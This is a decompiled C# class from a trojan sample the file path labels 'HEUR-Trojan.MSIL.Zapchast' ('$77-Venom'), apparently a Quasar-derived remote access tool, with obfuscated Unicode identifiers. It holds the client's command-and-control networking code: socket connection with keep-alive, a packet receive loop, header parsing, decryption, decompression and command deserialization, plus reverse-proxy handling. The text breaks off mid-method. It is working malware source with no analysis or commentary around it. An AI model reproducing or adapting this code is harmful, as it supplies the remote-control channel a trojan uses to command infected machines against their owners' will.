// Decompiled with JetBrains decompiler
// Type: ㄀�稾⼆涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸囈භ
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Zapchast.gen-defbae45ea8e71f8a50123f382f4538afc9db836de09bab316464d4793394f19.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using xClient.Core.NetSerializer;
using xClient.Core.ReverseProxy.Packets;
using xClient.Core.Utilities;

public class \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ
{
  private Socket 䨹痚賢飳糑嬂䘰ᜋ\uFFFD얬浈흕\uE019\uEFFC\uAAD8䡂\u24CF芸Ⳗ碈;
  private List<\uED81蘄ꫬ왒葧륦ଢ଼쩅徳\u0DF6蘃瀡\u2941草돒ቺ̽\u27CC\u27A2\u1C98> \uEF58꧷졫\uF3BD\uFFFDꖉᴮ鞠蚿삥贸\uE961ുၢ깞᪳\u2FA7笢๓靧;
  private readonly object 晑墆迦\u282B\uF4F2\uFFFD옔祦\u2E5F໒㬯ὤﱒ\uFFFD\u0DF6\u0885\u1FDF师要駫 = new object();
  private byte[] \u0AC2ﰱ\u336F\u31BF画䴰\uF6C4Уꕡ\uF30C眣굄饖ꚨ펷栏細䑹茨絣;
  private byte[] 尵菴\u2F30\uA7DF㵮\uEBC1艣묾ḍ훲쩣艽뇇ꃁ\uF5EEྷ녭㥴綰愨;
  private readonly Queue<byte[]> \u2014\uF6FBᴡ㪉む佘떕\uE3CC픯徳ᗮ嬀ꕭ\u2479ጧ\u2033稒꺭謂뢔 = new Queue<byte[]>();
  private bool 䘍틋爉䱦훧召\uF8F0㱿磤巍\uFBC1肖凍\u21B0\u0B5E湶泃㧹Α\uEC89;
  private readonly object 䜗鋸亊㳺ࢪᄘ\u2E17\uE45Cꑟ嬜\uE3DA谈鼩\u257Dᐶ㙍䋎礘悿뵵 = new object();
  private readonly Queue<byte[]> 챣띴旰ོ\uE227譗숍ૉ嚧䏲뼡㕵蹷朒쳘鬺䓫ु緦騊 = new Queue<byte[]>();
  private bool 돤谾眊鶅ḒꚌ\uFFFDᙿ쟇㔲\uE122Ʞ탬슣抠\uF6C8Ꮟ둁匄須;
  private readonly object 㫽죉\uE6E2\uEBC9鈳㪝㫋픉鞌殒荏㔥\u0E91佹痊چɒ菙ⶁ掅 = new object();
  private byte[] \uF7A4ℴ\uF077\u290F\uF22E僠ꟽᓂ脄殙ዙ鈮\u26E8昰㜐篦蹦㱷덮\uF09F;
  private bool \uFFFD\u3246ᮈ㺦뛇찝剳\uE307㮝ﲾ푠蛖班票蠩ﰀ叫蛝\u22FE酞;
  private int ꩱ\uEF58Ự劉ㆦ팾\u33CC彇썇\uE64F읂쾡ꨘ魬쁦靷Ⴃ雗坸ꮘ;
  private int ꑪꒉ鼀\uFDD7ʹ믨\uEF36뉿ᙴ胯开꺍㘶\uE543嚺㶺\uF13B傊刈쑢;
  private int ċ閩몉嘹ڷ\uE47E鼠傗\uF758\u26EA檤虑赀鷿䡓ㄚ谮㳌饙\u26D0;
  private int 츗ﵚᠳᑶ\u2452\uA49F吞\u1CFA奃說\u187E\uF439푽ᬲ肉儿ﳰ㑝ૌ\uEEC8;
  private int 탊\u3368䮩\u28F2埡\uA48D\uE2FEᳰ\uE322먾\u1AF7彃莁\uE9B8젗旱Ș隋\uFFFD䋥;
  private \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ.島㹻\u2A41Ṱ䮤\u0F48瓐倰\u20A7얚Ṥ役݃哱㽺㷥ಿ㵘睓쿿 \u1BA1偩ﱊ\uFAEE\u0CF8뜒鬢䋷餐ᖱէ則蹟ﱗ瞜ﲼ\uE178э쮩Ħ;
  private const bool 復氈䘣ꠧ䔈穲䚖\uE53C葎閌圣뛛\uF1EA\uAADA\uE3EA\uED50\uF02E\uECE2\uF163皢 = true;
  private const bool \uE06D顠韥ﷸꭓ曧寥饢캿힏\u226A낢蚼ఓᖖ\u2930ᶢ䛍㬮ꦛ = true;

  public event \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ.翤ꘉ骸晴掌훌\uA6FDήᇴ\u2E22釓\uE00E蚟挳䗷\u2FD6螬膥斫峽 ꡉ䮊ⵜꇹű嚯欽ꊂ\u19E6喍檅쨢倭\uF03D赂\uE616ݞ\uFFEE䳛牘;

  private void \u20B3ͭ뷅\u2235깽Ӄ\u061D㡜㱲쎬胄孬\u3227\u319B㕴㮢蠕叡蕙煤(Exception ex)
  {
    // ISSUE: reference to a compiler-generated field
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ.翤ꘉ骸晴掌훌\uA6FDήᇴ\u2E22釓\uE00E蚟挳䗷\u2FD6螬膥斫峽 摑ᥰꕐ㦀㶔烠鳋ꚜ욻㷛籟ᗵᶏꘌ귨튠ㄬꦏ = this.摑ᥰꕐ㦀㶔烠鳋\uE733ꚜ욻㷛籟ᗵᶏꘌ\u19DB귨튠ㄬꦏ;
    if (摑ᥰꕐ㦀㶔烠鳋ꚜ욻㷛籟ᗵᶏꘌ귨튠ㄬꦏ == null)
      return;
    摑ᥰꕐ㦀㶔烠鳋ꚜ욻㷛籟ᗵᶏꘌ귨튠ㄬꦏ(this, ex);
  }

  public event \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ.ꢄ絹ￏ恵襇럁\u2EC7笏㻣\u28C3ᱶ\uE8C5㫗咿㶠쇸퓫ᱲ㤣뵏 \uF255械썧๔닋뉲쨣\uEB5F啔\uEE6D\uF62F죫쇞ᒉ\uFFFDᐂ州ꄪ璗橫;

  private void \uFFFD緜\uF2EBⱘ\uE573\uF402\u28D6붨ퟸ蝪ꛇ䯀\u28D2ᄏ嗌䤦駇뤮ཆ깤(bool connected)
  {
    if (this.Connected == connected)
      return;
    this.Connected = connected;
    // ISSUE: reference to a compiler-generated field
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ.ꢄ絹ￏ恵襇럁\u2EC7笏㻣\u28C3ᱶ\uE8C5㫗咿㶠쇸퓫ᱲ㤣뵏 ꑫ흞动翥밵뢲憎핞僊늌蹫᷍ = this.ꑫ흞\uEE34动翥밵뢲憎\uEE17핞僊\uF75F\uA714\uF8AE늌蹫\u2153\uED4C\u1A5F᷍;
    if (ꑫ흞动翥밵뢲憎핞僊늌蹫᷍ == null)
      return;
    ꑫ흞动翥밵뢲憎핞僊늌蹫᷍(this, connected);
  }

  public event \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ.\u108C쌬먿圽ᙜ黦ꕛ\uA7ED㖵蔡뫝ꉼᅮ暾\u0A0E睯䟯\uF376\uE72Fゕ 婘\uED96䜠턔藴ǬΎꘜ烏\uEF1Fὐ蔗顀\uECFB\uE0B4\uEDAFﴭ巄\u2EBF\uE598;

  private void \uFB08䥬ዀ砬쁜\uFFFD씙魧뛦홌\uF206\uF54D攓\uEC53链컐홣\uFFFD惠ഔ(
    븞朱\uEBB8統ᡣꡜŶ\uF43D\uF85B蒣냋㡁臀핝닍뤱畱쪩㐨\u20DE packet)
  {
    // ISSUE: reference to a compiler-generated field
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ.\u108C쌬먿圽ᙜ黦ꕛ\uA7ED㖵蔡뫝ꉼᅮ暾\u0A0E睯䟯\uF376\uE72Fゕ 狱兮鏙탻柤筞磖螫뛵鱦耓漑칁船ꀇꛥ럇 = this.狱兮\uF59B鏙탻柤筞磖\uED41螫뛵鱦耓漑칁船ꀇꛥ럇\u2392;
    if (狱兮鏙탻柤筞磖螫뛵鱦耓漑칁船ꀇꛥ럇 == null)
      return;
    狱兮鏙탻柤筞磖螫뛵鱦耓漑칁船ꀇꛥ럇(this, packet);
  }

  public event \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ.뱦\u2361\uE5F2\uE9DF捄揍賛ሴ븘㲉隽\uE6E5ﰴ驊ᰓ첪㳑ξٖ\uE974 뾢㠆㨛栐焦䀁䂝绉ꖩ\uFFFD볙抅식顬花诰Ⅸ糫ἄ掏;

  private void 剘澌븓៩頻\uF34C㩝ｉ㔈藿渿ꎷ\uFFFD\u3249ሞ휒䐐腇\u296D墵(
    븞朱\uEBB8統ᡣꡜŶ\uF43D\uF85B蒣냋㡁臀핝닍뤱畱쪩㐨\u20DE packet,
    long length,
    byte[] rawData)
  {
    // ISSUE: reference to a compiler-generated field
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ.뱦\u2361\uE5F2\uE9DF捄揍賛ሴ븘㲉隽\uE6E5ﰴ驊ᰓ첪㳑ξٖ\uE974 뱦捄揍賛ሴ븘㲉隽ﰴ驊ᰓ첪㳑ξٖ = this.\u302B昘읚袬ꂁ꺍峿簨렖壓찐蝳ꚙ᳛堹墑킝ￏܨ\uE1F7;
    if (뱦捄揍賛ሴ븘㲉隽ﰴ驊ᰓ첪㳑ξٖ == null)
      return;
    뱦捄揍賛ሴ븘㲉隽ﰴ驊ᰓ첪㳑ξٖ(this, packet, length, rawData);
  }

  public int BUFFER_SIZE => 16384;

  public uint KEEP_ALIVE_TIME => 25000;

  public uint KEEP_ALIVE_INTERVAL => 25000;

  public int HEADER_SIZE => 4;

  public int MAX_PACKET_SIZE => 5242880;

  public \uED81蘄ꫬ왒葧륦ଢ଼쩅徳\u0DF6蘃瀡\u2941草돒ቺ̽\u27CC\u27A2\u1C98[] ProxyClients
  {
    get
    {
      lock (this.晑墆迦\u282B\uF4F2\uFFFD옔祦\u2E5F໒㬯ὤﱒ\uFFFD\u0DF6\u0885\u1FDF师要駫)
        return this.\uEF58꧷졫\uF3BD\uFFFDꖉᴮ鞠蚿삥贸\uE961ുၢ깞᪳\u2FA7笢๓靧.ToArray();
    }
  }

  public bool Connected { get; private set; }

  protected Serializer Serializer { get; set; }

  protected \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ()
  {
    this.\uEF58꧷졫\uF3BD\uFFFDꖉᴮ鞠蚿삥贸\uE961ുၢ깞᪳\u2FA7笢๓靧 = new List<\uED81蘄ꫬ왒葧륦ଢ଼쩅徳\u0DF6蘃瀡\u2941草돒ቺ̽\u27CC\u27A2\u1C98>();
    this.\u0AC2ﰱ\u336F\u31BF画䴰\uF6C4Уꕡ\uF30C眣굄饖ꚨ펷栏細䑹茨絣 = new byte[this.BUFFER_SIZE];
    this.\uF7A4ℴ\uF077\u290F\uF22E僠ꟽᓂ脄殙ዙ鈮\u26E8昰㜐篦蹦㱷덮\uF09F = new byte[this.HEADER_SIZE];
  }

  protected void 栶䢙ꪚꙮ\uF64B謮賳\uF0AA셺䕣塏ꨢ\uF1DA셥兓\uE546톎헩\u2E4B\u1CFF(IPAddress ip, ushort port)
  {
    try
    {
      this.킽믭죵䥭乫ౄ玤寞\u2B02濄앟毑\uFE5F\uAA39槔\uE764헽㸀泼梹();
      this.䨹痚賢飳糑嬂䘰ᜋ\uFFFD얬浈흕\uE019\uEFFC\uAAD8䡂\u24CF芸Ⳗ碈 = new Socket(ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
      this.䨹痚賢飳糑嬂䘰ᜋ\uFFFD얬浈흕\uE019\uEFFC\uAAD8䡂\u24CF芸Ⳗ碈.SetKeepAliveEx(this.KEEP_ALIVE_INTERVAL, this.KEEP_ALIVE_TIME);
      this.䨹痚賢飳糑嬂䘰ᜋ\uFFFD얬浈흕\uE019\uEFFC\uAAD8䡂\u24CF芸Ⳗ碈.Connect(ip, (int) port);
      if (!this.䨹痚賢飳糑嬂䘰ᜋ\uFFFD얬浈흕\uE019\uEFFC\uAAD8䡂\u24CF芸Ⳗ碈.Connected)
        return;
      this.䨹痚賢飳糑嬂䘰ᜋ\uFFFD얬浈흕\uE019\uEFFC\uAAD8䡂\u24CF芸Ⳗ碈.BeginReceive(this.\u0AC2ﰱ\u336F\u31BF画䴰\uF6C4Уꕡ\uF30C眣굄饖ꚨ펷栏細䑹茨絣, 0, this.\u0AC2ﰱ\u336F\u31BF画䴰\uF6C4Уꕡ\uF30C眣굄饖ꚨ펷栏細䑹茨絣.Length, SocketFlags.None, new AsyncCallback(this.\u29F5훍\u205E纣夙䖪憬㿨戈\uF24C南\u17EC\uEE57䜖\u29FE꘤\u239A뎹ᚱ\u2A2F), (object) null);
      this.\uFFFD緜\uF2EBⱘ\uE573\uF402\u28D6붨ퟸ蝪ꛇ䯀\u28D2ᄏ嗌䤦駇뤮ཆ깤(true);
    }
    catch (Exception ex)
    {
      this.\u20B3ͭ뷅\u2235깽Ӄ\u061D㡜㱲쎬胄孬\u3227\u319B㕴㮢蠕叡蕙煤(ex);
    }
  }

  private void \u29F5훍\u205E纣夙䖪憬㿨戈\uF24C南\u17EC\uEE57䜖\u29FE꘤\u239A뎹ᚱ\u2A2F(IAsyncResult result)
  {
    int length;
    try
    {
      length = this.䨹痚賢飳糑嬂䘰ᜋ\uFFFD얬浈흕\uE019\uEFFC\uAAD8䡂\u24CF芸Ⳗ碈.EndReceive(result);
      if (length <= 0)
        throw new Exception("no bytes transferred");
    }
    catch (NullReferenceException ex)
    {
      return;
    }
    catch (ObjectDisposedException ex)
    {
      return;
    }
    catch (Exception ex)
    {
      this.킽믭죵䥭乫ౄ玤寞\u2B02濄앟毑\uFE5F\uAA39槔\uE764헽㸀泼梹();
      return;
    }
    byte[] destinationArray = new byte[length];
    try
    {
      Array.Copy((Array) this.\u0AC2ﰱ\u336F\u31BF画䴰\uF6C4Уꕡ\uF30C眣굄饖ꚨ펷栏細䑹茨絣, (Array) destinationArray, destinationArray.Length);
    }
    catch (Exception ex)
    {
      this.\u20B3ͭ뷅\u2235깽Ӄ\u061D㡜㱲쎬胄孬\u3227\u319B㕴㮢蠕叡蕙煤(ex);
      return;
    }
    lock (this.챣띴旰ོ\uE227譗숍ૉ嚧䏲뼡㕵蹷朒쳘鬺䓫ु緦騊)
      this.챣띴旰ོ\uE227譗숍ૉ嚧䏲뼡㕵蹷朒쳘鬺䓫ु緦騊.Enqueue(destinationArray);
    lock (this.㫽죉\uE6E2\uEBC9鈳㪝㫋픉鞌殒荏㔥\u0E91佹痊چɒ菙ⶁ掅)
    {
      if (!this.돤谾眊鶅ḒꚌ\uFFFDᙿ쟇㔲\uE122Ʞ탬슣抠\uF6C8Ꮟ둁匄須)
      {
        this.돤谾眊鶅ḒꚌ\uFFFDᙿ쟇㔲\uE122Ʞ탬슣抠\uF6C8Ꮟ둁匄須 = true;
        ThreadPool.QueueUserWorkItem(new WaitCallback(this.\uE322侀뗇䕈ꯨ㱜\uE826䪝㼙煓óㆴ\uEA44О婸ꚼ\uFFFD髲\uE0D8阯));
      }
    }
    try
    {
      this.䨹痚賢飳糑嬂䘰ᜋ\uFFFD얬浈흕\uE019\uEFFC\uAAD8䡂\u24CF芸Ⳗ碈.BeginReceive(this.\u0AC2ﰱ\u336F\u31BF画䴰\uF6C4Уꕡ\uF30C眣굄饖ꚨ펷栏細䑹茨絣, 0, this.\u0AC2ﰱ\u336F\u31BF画䴰\uF6C4Уꕡ\uF30C眣굄饖ꚨ펷栏細䑹茨絣.Length, SocketFlags.None, new AsyncCallback(this.\u29F5훍\u205E纣夙䖪憬㿨戈\uF24C南\u17EC\uEE57䜖\u29FE꘤\u239A뎹ᚱ\u2A2F), (object) null);
    }
    catch (ObjectDisposedException ex)
    {
    }
    catch (Exception ex)
    {
      this.\u20B3ͭ뷅\u2235깽Ӄ\u061D㡜㱲쎬胄孬\u3227\u319B㕴㮢蠕叡蕙煤(ex);
    }
  }

  private void \uE322侀뗇䕈ꯨ㱜\uE826䪝㼙煓óㆴ\uEA44О婸ꚼ\uFFFD髲\uE0D8阯(object state)
  {
    while (true)
    {
      byte[] sourceArray;
      lock (this.챣띴旰ོ\uE227譗숍ૉ嚧䏲뼡㕵蹷朒쳘鬺䓫ु緦騊)
      {
        if (this.챣띴旰ོ\uE227譗숍ૉ嚧䏲뼡㕵蹷朒쳘鬺䓫ु緦騊.Count == 0)
        {
          lock (this.㫽죉\uE6E2\uEBC9鈳㪝㫋픉鞌殒荏㔥\u0E91佹痊چɒ菙ⶁ掅)
          {
            this.돤谾眊鶅ḒꚌ\uFFFDᙿ쟇㔲\uE122Ʞ탬슣抠\uF6C8Ꮟ둁匄須 = false;
            break;
          }
        }
        else
          sourceArray = this.챣띴旰ོ\uE227譗숍ૉ嚧䏲뼡㕵蹷朒쳘鬺䓫ु緦騊.Dequeue();
      }
      this.츗ﵚᠳᑶ\u2452\uA49F吞\u1CFA奃說\u187E\uF439푽ᬲ肉儿ﳰ㑝ૌ\uEEC8 += sourceArray.Length;
      bool flag1 = true;
      while (flag1)
      {
        switch (this.\u1BA1偩ﱊ\uFAEE\u0CF8뜒鬢䋷餐ᖱէ則蹟ﱗ瞜ﲼ\uE178э쮩Ħ)
        {
          case \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ.島㹻\u2A41Ṱ䮤\u0F48瓐倰\u20A7얚Ṥ役݃哱㽺㷥ಿ㵘睓쿿.鶕᪐\uE871觘\uF66D\uF885\uF108燱ᕐᨱ䨧鹬Ͻ嫼쬈燓\u17F8Ｊ庻\u1C9F:
            if (this.츗ﵚᠳᑶ\u2452\uA49F吞\u1CFA奃說\u187E\uF439푽ᬲ肉儿ﳰ㑝ૌ\uEEC8 + this.ċ閩몉嘹ڷ\uE47E鼠傗\uF758\u26EA檤虑赀鷿䡓ㄚ谮㳌饙\u26D0 >= this.HEADER_SIZE)
            {
              int length = this.\uFFFD\u3246ᮈ㺦뛇찝剳\uE307㮝ﲾ푠蛖班票蠩ﰀ叫蛝\u22FE酞 ? this.HEADER_SIZE - this.ċ閩몉嘹ڷ\uE47E鼠傗\uF758\u26EA檤虑赀鷿䡓ㄚ谮㳌饙\u26D0 : this.HEADER_SIZE;
              try
              {
                if (this.\uFFFD\u3246ᮈ㺦뛇찝剳\uE307㮝ﲾ푠蛖班票蠩ﰀ叫蛝\u22FE酞)
                {
                  try
                  {
                    Array.Copy((Array) sourceArray, this.ꩱ\uEF58Ự劉ㆦ팾\u33CC彇썇\uE64F읂쾡ꨘ魬쁦靷Ⴃ雗坸ꮘ, (Array) this.\uF7A4ℴ\uF077\u290F\uF22E僠ꟽᓂ脄殙ዙ鈮\u26E8昰㜐篦蹦㱷덮\uF09F, this.ċ閩몉嘹ڷ\uE47E鼠傗\uF758\u26EA檤虑赀鷿䡓ㄚ谮㳌饙\u26D0, length);
                  }
                  catch (Exception ex)
                  {
                    flag1 = false;
                    this.\u20B3ͭ뷅\u2235깽Ӄ\u061D㡜㱲쎬胄孬\u3227\u319B㕴㮢蠕叡蕙煤(ex);
                    continue;
                  }
                  this.탊\u3368䮩\u28F2埡\uA48D\uE2FEᳰ\uE322먾\u1AF7彃莁\uE9B8젗旱Ș隋\uFFFD䋥 = BitConverter.ToInt32(this.\uF7A4ℴ\uF077\u290F\uF22E僠ꟽᓂ脄殙ዙ鈮\u26E8昰㜐篦蹦㱷덮\uF09F, 0);
                  this.ċ閩몉嘹ڷ\uE47E鼠傗\uF758\u26EA檤虑赀鷿䡓ㄚ谮㳌饙\u26D0 = 0;
                  this.\uFFFD\u3246ᮈ㺦뛇찝剳\uE307㮝ﲾ푠蛖班票蠩ﰀ叫蛝\u22FE酞 = false;
                }
                else
                  this.탊\u3368䮩\u28F2埡\uA48D\uE2FEᳰ\uE322먾\u1AF7彃莁\uE9B8젗旱Ș隋\uFFFD䋥 = BitConverter.ToInt32(sourceArray, this.ꩱ\uEF58Ự劉ㆦ팾\u33CC彇썇\uE64F읂쾡ꨘ魬쁦靷Ⴃ雗坸ꮘ);
                if (this.탊\u3368䮩\u28F2埡\uA48D\uE2FEᳰ\uE322먾\u1AF7彃莁\uE9B8젗旱Ș隋\uFFFD䋥 > 0)
                {
                  if (this.탊\u3368䮩\u28F2埡\uA48D\uE2FEᳰ\uE322먾\u1AF7彃莁\uE9B8젗旱Ș隋\uFFFD䋥 <= this.MAX_PACKET_SIZE)
                    goto label_24;
                }
                throw new Exception("invalid header");
              }
              catch (Exception ex)
              {
                flag1 = false;
                this.킽믭죵䥭乫ౄ玤寞\u2B02濄앟毑\uFE5F\uAA39槔\uE764헽㸀泼梹();
                continue;
              }
label_24:
              this.츗ﵚᠳᑶ\u2452\uA49F吞\u1CFA奃說\u187E\uF439푽ᬲ肉儿ﳰ㑝ૌ\uEEC8 -= length;
              this.ꩱ\uEF58Ự劉ㆦ팾\u33CC彇썇\uE64F읂쾡ꨘ魬쁦靷Ⴃ雗坸ꮘ += length;
              this.\u1BA1偩ﱊ\uFAEE\u0CF8뜒鬢䋷餐ᖱէ則蹟ﱗ瞜ﲼ\uE178э쮩Ħ = \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ.島㹻\u2A41Ṱ䮤\u0F48瓐倰\u20A7얚Ṥ役݃哱㽺㷥ಿ㵘睓쿿.\uE8AFࣦ脇挛挕潕漶涊턬Ꙛ䴎鶌\uF3FA\uE7E0눻鞚\u2681먚岛ओ;
              continue;
            }
            try
            {
              Array.Copy((Array) sourceArray, this.ꩱ\uEF58Ự劉ㆦ팾\u33CC彇썇\uE64F읂쾡ꨘ魬쁦靷Ⴃ雗坸ꮘ, (Array) this.\uF7A4ℴ\uF077\u290F\uF22E僠ꟽᓂ脄殙ዙ鈮\u26E8昰㜐篦蹦㱷덮\uF09F, this.ċ閩몉嘹ڷ\uE47E鼠傗\uF758\u26EA檤虑赀鷿䡓ㄚ谮㳌饙\u26D0, this.츗ﵚᠳᑶ\u2452\uA49F吞\u1CFA奃說\u187E\uF439푽ᬲ肉儿ﳰ㑝ૌ\uEEC8);
            }
            catch (Exception ex)
            {
              flag1 = false;
              this.\u20B3ͭ뷅\u2235깽Ӄ\u061D㡜㱲쎬胄孬\u3227\u319B㕴㮢蠕叡蕙煤(ex);
              continue;
            }
            this.ċ閩몉嘹ڷ\uE47E鼠傗\uF758\u26EA檤虑赀鷿䡓ㄚ谮㳌饙\u26D0 += this.츗ﵚᠳᑶ\u2452\uA49F吞\u1CFA奃說\u187E\uF439푽ᬲ肉儿ﳰ㑝ૌ\uEEC8;
            this.\uFFFD\u3246ᮈ㺦뛇찝剳\uE307㮝ﲾ푠蛖班票蠩ﰀ叫蛝\u22FE酞 = true;
            flag1 = false;
            continue;
          case \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ.島㹻\u2A41Ṱ䮤\u0F48瓐倰\u20A7얚Ṥ役݃哱㽺㷥ಿ㵘睓쿿.\uE8AFࣦ脇挛挕潕漶涊턬Ꙛ䴎鶌\uF3FA\uE7E0눻鞚\u2681먚岛ओ:
            if (this.尵菴\u2F30\uA7DF㵮\uEBC1艣묾ḍ훲쩣艽뇇ꃁ\uF5EEྷ녭㥴綰愨 == null || this.尵菴\u2F30\uA7DF㵮\uEBC1艣묾ḍ훲쩣艽뇇ꃁ\uF5EEྷ녭㥴綰愨.Length != this.탊\u3368䮩\u28F2埡\uA48D\uE2FEᳰ\uE322먾\u1AF7彃莁\uE9B8젗旱Ș隋\uFFFD䋥)
              this.尵菴\u2F30\uA7DF㵮\uEBC1艣묾ḍ훲쩣艽뇇ꃁ\uF5EEྷ녭㥴綰愨 = new byte[this.탊\u3368䮩\u28F2埡\uA48D\uE2FEᳰ\uE322먾\u1AF7彃莁\uE9B8젗旱Ș隋\uFFFD䋥];
            int length1 = this.ꑪꒉ鼀\uFDD7ʹ믨\uEF36뉿ᙴ胯开꺍㘶\uE543嚺㶺\uF13B傊刈쑢 + this.츗ﵚᠳᑶ\u2452\uA49F吞\u1CFA奃說\u187E\uF439푽ᬲ肉儿ﳰ㑝ૌ\uEEC8 >= this.탊\u3368䮩\u28F2埡\uA48D\uE2FEᳰ\uE322먾\u1AF7彃莁\uE9B8젗旱Ș隋\uFFFD䋥 ? this.탊\u3368䮩\u28F2埡\uA48D\uE2FEᳰ\uE322먾\u1AF7彃莁\uE9B8젗旱Ș隋\uFFFD䋥 - this.ꑪꒉ鼀\uFDD7ʹ믨\uEF36뉿ᙴ胯开꺍㘶\uE543嚺㶺\uF13B傊刈쑢 : this.츗ﵚᠳᑶ\u2452\uA49F吞\u1CFA奃說\u187E\uF439푽ᬲ肉儿ﳰ㑝ૌ\uEEC8;
            try
            {
              Array.Copy((Array) sourceArray, this.ꩱ\uEF58Ự劉ㆦ팾\u33CC彇썇\uE64F읂쾡ꨘ魬쁦靷Ⴃ雗坸ꮘ, (Array) this.尵菴\u2F30\uA7DF㵮\uEBC1艣묾ḍ훲쩣艽뇇ꃁ\uF5EEྷ녭㥴綰愨, this.ꑪꒉ鼀\uFDD7ʹ믨\uEF36뉿ᙴ胯开꺍㘶\uE543嚺㶺\uF13B傊刈쑢, length1);
            }
            catch (Exception ex)
            {
              flag1 = false;
              this.\u20B3ͭ뷅\u2235깽Ӄ\u061D㡜㱲쎬胄孬\u3227\u319B㕴㮢蠕叡蕙煤(ex);
              continue;
            }
            this.ꑪꒉ鼀\uFDD7ʹ믨\uEF36뉿ᙴ胯开꺍㘶\uE543嚺㶺\uF13B傊刈쑢 += length1;
            this.ꩱ\uEF58Ự劉ㆦ팾\u33CC彇썇\uE64F읂쾡ꨘ魬쁦靷Ⴃ雗坸ꮘ += length1;
            this.츗ﵚᠳᑶ\u2452\uA49F吞\u1CFA奃說\u187E\uF439푽ᬲ肉儿ﳰ㑝ૌ\uEEC8 -= length1;
            if (this.ꑪꒉ鼀\uFDD7ʹ믨\uEF36뉿ᙴ胯开꺍㘶\uE543嚺㶺\uF13B傊刈쑢 == this.탊\u3368䮩\u28F2埡\uA48D\uE2FEᳰ\uE322먾\u1AF7彃莁\uE9B8젗旱Ș隋\uFFFD䋥)
            {
              bool flag2 = this.尵菴\u2F30\uA7DF㵮\uEBC1艣묾ḍ훲쩣艽뇇ꃁ\uF5EEྷ녭㥴綰愨.Length == 0;
              if (!flag2)
              {
                this.尵菴\u2F30\uA7DF㵮\uEBC1艣묾ḍ훲쩣艽뇇ꃁ\uF5EEྷ녭㥴綰愨 = 槦\uFFFD辺櫌\uEA69ɱ\uE127\uE010銃㡔臚\uAACE蒂ἄ鞷퀆\u2A62鲮䛱黖.\uFFFD빚ꍮレ叼侽钲狷徸\u32E8ᕈꣽ絨蜞\u32DF從䩃댛枘顏(this.尵菴\u2F30\uA7DF㵮\uEBC1艣묾ḍ훲쩣艽뇇ꃁ\uF5EEྷ녭㥴綰愨);
                flag2 = this.尵菴\u2F30\uA7DF㵮\uEBC1艣묾ḍ훲쩣艽뇇ꃁ\uF5EEྷ녭㥴綰愨.Length == 0;
              }
              if (!flag2)
              {
                try
                {
                  this.尵菴\u2F30\uA7DF㵮\uEBC1艣묾ḍ훲쩣艽뇇ꃁ\uF5EEྷ녭㥴綰愨 = \uF053‫\uE3AD戾\uF295䓮ᒿ냕뚩钢\uEB78㝻\uF56Fఱ颎\uA672대䟽Ⴑ\u3376.ﻤᘂꉪ䫟媧\uFFFD鲊ｆ朊\uEACF\u2FEA궛\uEE28즋錄ꢅꌤ\uEBA3攐\uF658(this.尵菴\u2F30\uA7DF㵮\uEBC1艣묾ḍ훲쩣艽뇇ꃁ\uF5EEྷ녭㥴綰愨);
                }
                catch (Exception ex)
                {
                  flag1 = false;
                  this.킽믭죵䥭乫ౄ玤寞\u2B02濄앟毑\uFE5F\uAA39槔\uE764헽㸀泼梹();
                  continue;
                }
                flag2 = this.尵菴\u2F30\uA7DF㵮\uEBC1艣묾ḍ훲쩣艽뇇ꃁ\uF5EEྷ녭㥴綰愨.Length == 0;
              }
              if (flag2)
              {
                flag1 = false;
                this.킽믭죵䥭乫ౄ玤寞\u2B02濄앟毑\uFE5F\uAA39槔\uE764헽㸀泼梹();
                continue;
              }
              using (MemoryStream memoryStream = new MemoryStream(this.尵菴\u2F30\uA7DF㵮\uEBC1艣묾ḍ훲쩣艽뇇ꃁ\uF5EEྷ녭㥴綰愨))
              {
                try
                {
                  this.\uFB08䥬ዀ砬쁜\uFFFD씙魧뛦홌\uF206\uF54D攓\uEC53链컐홣\uFFFD惠ഔ((븞朱\uEBB8統ᡣꡜŶ\uF43D\uF85B蒣냋㡁臀핝닍뤱畱쪩㐨\u20DE) this.Serializer.Deserialize((Stream) memoryStream));
                }
                catch (Exception ex)
                {
                  flag1 = false;
                  this.\u20B3ͭ뷅\u2235깽Ӄ\u061D㡜㱲쎬胄孬\u3227\u319B㕴㮢蠕叡蕙煤(ex);
                  continue;
                }
              }
